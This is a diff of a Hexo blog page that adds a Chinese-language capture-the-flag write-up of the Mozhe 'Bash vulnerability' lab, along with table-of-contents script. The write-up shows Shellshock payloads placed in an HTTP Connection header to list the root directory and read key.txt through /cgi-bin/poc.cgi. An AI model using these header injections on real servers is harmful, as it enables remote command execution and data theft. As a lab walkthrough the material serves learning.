@@ -13,7 +13,7 @@
 
 
 
-<title>page | Hexo</title>
+<title>墨者bash | Hexo</title>
 
 
 
@@ -127,11 +127,73 @@
                 <div class="container">
     
     
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
 
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">page</h1>
+            <h1 class="post-title">墨者bash</h1>
             
                 <div class="post-meta">
                     
@@ -140,7 +202,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">June 2, 2025&nbsp;&nbsp;17:11:41</a>
+                        Date: <a href="#">June 7, 2025&nbsp;&nbsp;21:21:31</a>
                         </span>
                     
                     
@@ -149,7 +211,24 @@
         </header>
 
         <div class="post-content">
-            
+            <h1 id="墨者Bash漏洞分析溯源"><a href="#墨者Bash漏洞分析溯源" class="headerlink" title="墨者Bash漏洞分析溯源"></a>墨者Bash漏洞分析溯源</h1><p><img src="https://c.img.dasctf.com/LightPicture/2024/07/a1b83357eff3d2f4.png" alt="a1b83357eff3d2f4.png"></p>
+<p>打开题目环境</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2024/07/d757cdab77934805.png" alt="d757cdab77934805.png"></p>
+<p>Bash漏洞存在的路径多数在网页<code>/cgi-bin/</code>下，打开此网页。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/cgi-bin/poc.cgi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2024/07/1040a34a9011bd9d.png" alt="1040a34a9011bd9d.png"></p>
+<p>此漏洞是存在的，使用bp抓包</p>
+<p>把在下面的Connection的参数，改成我们的执行代码。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connection: () &#123; :;&#125;; <span class="built_in">echo</span>; /bin/ls /</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2024/07/5f9360e8c55d589c.png" alt="5f9360e8c55d589c.png"></p>
+<p>继续执行我们的命令 看key.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connection: () &#123; :;&#125;; <span class="built_in">echo</span>; /bin/cat /key.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2024/07/34c32de1d8d9192c.png" alt="34c32de1d8d9192c.png"></p>
+<p>问题解决</p>
+
         </div>
 
         
@@ -163,7 +242,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://example.com/2025/06/02/page/">http://example.com/2025/06/02/page/</a></span>
+                        <span><a href="http://example.com/2025/06/07/%E5%A2%A8%E8%80%85bash/">http://example.com/2025/06/07/%E5%A2%A8%E8%80%85bash/</a></span>
                     </p>
                 
                 
@@ -196,10 +275,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2025/06/07/%E5%A2%A8%E8%80%85bash/">墨者bash</a>
             
-            
-            <a class="next" rel="next" href="/2025/06/02/blog1/">ISCC ShallowSeek</a>
+            <a class="next" rel="next" href="/2025/06/02/page/">page</a>
             
         </section>
 
